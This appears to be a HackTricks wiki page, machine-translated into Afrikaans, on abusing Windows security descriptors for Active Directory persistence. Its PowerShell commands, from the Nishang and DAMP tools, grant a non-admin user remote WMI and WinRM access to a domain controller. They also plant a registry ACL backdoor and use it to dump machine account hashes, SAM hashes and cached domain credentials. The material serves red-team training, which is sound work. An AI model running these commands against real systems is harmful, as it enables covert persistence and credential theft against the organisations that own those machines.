# Sekuriteitsbeskrywings

{{#include ../../banners/hacktricks-training.md}}

## Sekuriteitsbeskrywings

[Uit die dokumentasie](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Sekuriteitsbeskrywing Definisietaal (SDDL) definieer die formaat wat gebruik word om 'n sekuriteitsbeskrywing te beskryf. SDDL gebruik ACE stringe vir DACL en SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Die **sekuriteitsbeskrywings** word gebruik om die **regte** wat 'n **objek** oor 'n **objek** het, te **stoor**. As jy net 'n **klein verandering** in die **sekuriteitsbeskrywing** van 'n objek kan **maak**, kan jy baie interessante voorregte oor daardie objek verkry sonder om 'n lid van 'n bevoorregte groep te wees.

Dan is hierdie volhardingstegniek gebaseer op die vermoë om elke voorreg wat teen sekere objek benodig word, te wen, om 'n taak uit te voer wat gewoonlik admin voorregte vereis, maar sonder die behoefte om admin te wees.

### Toegang tot WMI

Jy kan 'n gebruiker toegang gee om **afgeleë WMI** [**uit te voer**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Toegang tot WinRM

Gee toegang tot **winrm PS-konsol aan 'n gebruiker** [**gebruik hierdie**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Afgeleë toegang tot hashes

Toegang tot die **register** en **dump hashes** deur 'n **Reg agterdeur te skep met** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** sodat jy op enige tydstip die **hash van die rekenaar**, die **SAM** en enige **gekas AD** geloofsbrief in die rekenaar kan terugkry. Dit is dus baie nuttig om hierdie toestemming aan 'n **gewone gebruiker teen 'n Domeinbeheerder rekenaar** te gee:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Kyk na [**Silver Tickets**](silver-ticket.md) om te leer hoe jy die hash van die rekenaarrekening van 'n Domeinbeheerder kan gebruik.

{{#include ../../banners/hacktricks-training.md}}
